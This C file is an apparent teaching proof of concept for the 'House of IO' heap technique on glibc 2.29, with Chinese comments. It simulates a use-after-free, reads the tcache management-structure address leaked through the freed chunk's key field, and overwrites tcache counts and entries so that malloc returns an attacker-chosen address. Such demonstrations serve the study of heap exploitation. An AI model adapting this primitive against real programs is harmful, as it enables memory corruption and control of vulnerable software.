/*
 * House of IO：对应 glibc 2.29 的 char-counts 布局。
 *
 * 漏洞模型：free 之后仍能读写用户对象 +8 处的字段（也就是一次 UAF）。
 * 2.29 在把 chunk 释放进 tcache 时，会把 e->key 写成 tcache_perthread_struct
 * 自身的地址，这等于白白泄露了管理结构的地址；拿到这个地址之后，直接
 * 改写 counts/entries，就能让 malloc 返回任意指定的地址。
 *
 * 2.30 起 counts 从 char[64] 改成了 uint16_t[64]，需要用另一份 PoC 来
 * 验证；2.34 起 key 变成随机的进程相关值，不再泄露 tcache 指针，原始
 * House of IO 到这里就结束了。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

struct freed_overlay {
    void *next;
    void *key;
};

struct tcache_229 {
    unsigned char counts[64];
    void *entries[64];
};

static uint64_t target[2];

int main(void)
{
    struct freed_overlay *victim;
    struct tcache_229 *tcache;
    void *result;

    setbuf(stdout, NULL);

    victim = malloc(0x10);            /* 物理 size=0x20，属于 tc_idx=0 */
    if (victim == NULL)
        return 1;

    free(victim);

    /* UAF 读取：2.29 的 tcache_put 会执行 e->key = tcache。 */
    tcache = victim->key;
    assert(tcache != NULL);

    /* 漏洞模拟：直接控制 tcache 的元数据。target 是一个 0x10 对齐的
     * BSS 数组，target[0]=0 正好也能让 tcache_get 读到一个干净的 next。
     */
    tcache->counts[0] = 1;
    tcache->entries[0] = target;

    result = malloc(0x10);
    assert(result == target);

    printf("[+] IO：tcache=%p，结果=%p\n",
           (void *)tcache, result);
    return 0;
}
